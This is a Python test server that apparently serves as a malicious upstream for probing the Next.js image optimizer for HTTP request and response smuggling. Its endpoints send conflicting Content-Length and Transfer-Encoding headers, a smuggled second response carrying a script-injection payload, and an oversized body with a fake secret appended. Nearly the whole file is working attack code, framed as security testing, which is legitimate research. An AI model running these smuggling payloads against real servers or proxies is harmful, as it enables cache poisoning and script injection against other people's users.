#!/usr/bin/env python3
"""
HTTP Request Smuggling Test Server
===================================

Tests if Next.js image optimizer is vulnerable to HTTP request smuggling
via manipulated responses from the upstream server.

Attack vectors:
1. Content-Length mismatch
2. Transfer-Encoding manipulation  
3. Connection: keep-alive exploitation
4. Chunked encoding smuggling
"""

import socket
import threading

def handle_client(conn, addr):
    try:
        data = conn.recv(4096)
        request = data.decode('utf-8', errors='ignore')
        print(f"\n[SMUGGLE] Request from {addr}")
        print(f"Path: {request.split()[1] if len(request.split()) > 1 else 'unknown'}")
        
        if '/cl-te' in request:
            # Content-Length / Transfer-Encoding smuggling
            # Send conflicting headers
            response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: image/png\r\n"
                "Content-Length: 70\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
            )
            # Minimal PNG
            png = bytes([
                0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
                0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
                0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41,
                0x54, 0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00,
                0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
                0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
                0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
            ])
            conn.send(response.encode() + png)
            
        elif '/double-response' in request:
            # Send two HTTP responses in one connection
            png = bytes([
                0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
                0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
                0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41,
                0x54, 0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00,
                0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
                0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
                0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
            ])
            response1 = (
                f"HTTP/1.1 200 OK\r\n"
                f"Content-Type: image/png\r\n"
                f"Content-Length: {len(png)}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            # Second response smuggled after first
            smuggled = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: text/html\r\n"
                "X-Smuggled: true\r\n"
                "\r\n"
                "<html><script>alert('smuggled')</script></html>"
            )
            conn.send(response1.encode() + png + smuggled.encode())
            
        elif '/short-content' in request:
            # Content-Length shorter than actual body
            png = bytes([
                0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
                0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
                0xde
            ])
            extra = b"EXTRA_DATA_THAT_SHOULDNT_BE_INCLUDED_SECRET_KEY_12345"
            response = (
                f"HTTP/1.1 200 OK\r\n"
                f"Content-Type: image/png\r\n"
                f"Content-Length: {len(png)}\r\n"  # Only count PNG length
                f"\r\n"
            )
            conn.send(response.encode() + png + extra)
            
        else:
            # Normal response
            png = bytes([
                0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
                0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
                0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41,
                0x54, 0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00,
                0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
                0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
                0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
            ])
            response = (
                f"HTTP/1.1 200 OK\r\n"
                f"Content-Type: image/png\r\n"
                f"Content-Length: {len(png)}\r\n"
                f"\r\n"
            )
            conn.send(response.encode() + png)
            
    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        conn.close()

def main():
    port = 9808
    print("=" * 60)
    print(" HTTP Request Smuggling Test Server")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print("\nEndpoints:")
    print("  /normal         - Normal response")
    print("  /cl-te          - Content-Length + Transfer-Encoding conflict")
    print("  /double-response - Two HTTP responses")
    print("  /short-content  - Content-Length shorter than body")
    print("=" * 60)
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('127.0.0.1', port))
    server.listen(5)
    
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()

if __name__ == "__main__":
    main()
